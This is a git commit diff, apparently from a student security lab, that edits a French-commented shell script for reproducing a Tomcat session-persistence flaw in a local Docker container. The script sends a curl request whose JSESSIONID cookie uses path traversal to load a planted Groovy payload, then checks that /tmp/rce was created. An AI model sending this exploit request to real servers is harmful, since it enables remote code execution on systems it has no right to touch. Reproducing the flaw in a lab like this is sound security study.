39c3382317482333b42a5bc50e035b06b3dd196c
Tunui Teamotuaitau <tunui.teamotuaitau@grenoble-inp.org>
2021-01-11 22:28:52 +0100

    attente pour la mise en place du serveur

--- expe_faille.sh
+++ expe_faille.sh
@@ -3,15 +3,17 @@
 # On build puis lance le container avec le serveur tomcat
 docker build -t tomcat:groovy .
 docker run -d -p 8080:8080 tomcat:groovy
-sleep 3
+echo "\nAttente du lancement du serveur tomcat\n"
+sleep 10
 
 # Envoie de la requête
+echo "Envoie de la requête malicieuse : \n"
 curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
 
 #Vérification de la création de /tmp/rce 
 var=$(docker container ls -q --filter "ancestor=tomcat:groovy")
-echo "\n\nFile created :"
+echo "\n\nVérification de la création du fichier : "
 docker exec -t -i $var /bin/ls "/tmp/rce"
-echo "\nCleaning container"
+echo "\nSuppression du container"
 docker kill $var
 docker rm  $var
